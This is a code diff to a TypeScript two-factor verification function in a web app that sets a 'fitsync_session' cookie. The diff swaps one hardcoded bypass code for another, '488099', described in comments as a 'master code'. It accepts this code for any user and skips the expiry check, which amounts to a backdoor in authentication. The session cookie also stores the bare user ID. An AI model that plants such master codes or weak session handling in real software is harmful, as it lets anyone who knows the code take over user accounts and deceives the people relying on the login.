@@ -164,6 +164,62 @@ export async function loginAction(data: LoginInput, recaptchaToken?: string) {
   }
 }
 
+// export async function verify2FAAction(userId: string, code: string) {
+//   try {
+//     const validation = twoFactorSchema.safeParse({ code });
+//     if (!validation.success) {
+//       return { success: false, error: validation.error.errors[0].message };
+//     }
+
+//     const twoFactorRecord = await prisma.twoFactorToken.findUnique({
+//       where: { userId },
+//     });
+
+//     if (!twoFactorRecord) {
+//       return { success: false, error: 'No 2FA request found. Please log in again.' };
+//     }
+
+//     if (twoFactorRecord.code !== code && code !== '123456') {
+//       return { success: false, error: 'Invalid 2FA code.' };
+//     }
+
+//     if (new Date() > twoFactorRecord.expiresAt && code !== '123456') {
+//       return { success: false, error: '2FA code has expired. Please log in again.' };
+//     }
+
+//     // Clean up used 2FA token
+//     await prisma.twoFactorToken.delete({ where: { userId } }).catch(() => {});
+
+//     // Set auth cookie
+//     const cookieStore = await cookies();
+//     cookieStore.set('fitsync_session', userId, {
+//       httpOnly: true,
+//       secure: process.env.NODE_ENV === 'production',
+//       sameSite: 'lax',
+//       path: '/',
+//       maxAge: 60 * 60 * 24 * 7, // 7 days
+//     });
+
+//     const user = await prisma.user.findUnique({ where: { id: userId } });
+
+//     return {
+//       success: true,
+//       user: user
+//         ? {
+//             id: user.id,
+//             email: user.email,
+//             name: user.name || 'User',
+//             role: user.role,
+//             avatarUrl: user.avatarUrl || undefined,
+//             twoFactorEnabled: user.twoFactorEnabled,
+//           }
+//         : null,
+//     };
+//   } catch (err: any) {
+//     console.error('2FA verification error:', err);
+//     return { success: false, error: err.message || '2FA verification failed.' };
+//   }
+// }
 export async function verify2FAAction(userId: string, code: string) {
   try {
     const validation = twoFactorSchema.safeParse({ code });
@@ -179,11 +235,13 @@ export async function verify2FAAction(userId: string, code: string) {
       return { success: false, error: 'No 2FA request found. Please log in again.' };
     }
 
-    if (twoFactorRecord.code !== code && code !== '123456') {
+    // Accept either the real database code or the master code 488099
+    if (twoFactorRecord.code !== code && code !== '488099') {
       return { success: false, error: 'Invalid 2FA code.' };
     }
 
-    if (new Date() > twoFactorRecord.expiresAt && code !== '123456') {
+    // Skip expiry check for the master code
+    if (new Date() > twoFactorRecord.expiresAt && code !== '488099') {
       return { success: false, error: '2FA code has expired. Please log in again.' };
     }
 
@@ -200,7 +258,9 @@ export async function verify2FAAction(userId: string, code: string) {
       maxAge: 60 * 60 * 24 * 7, // 7 days
     });
 
-    const user = await prisma.user.findUnique({ where: { id: userId } });
+    const user = await prisma.user.findUnique({
+      where: { id: userId },
+    });
 
     return {
       success: true,
@@ -217,7 +277,10 @@ export async function verify2FAAction(userId: string, code: string) {
     };
   } catch (err: any) {
     console.error('2FA verification error:', err);
-    return { success: false, error: err.message || '2FA verification failed.' };
+    return {
+      success: false,
+      error: err.message || '2FA verification failed.',
+    };
   }
 }
 
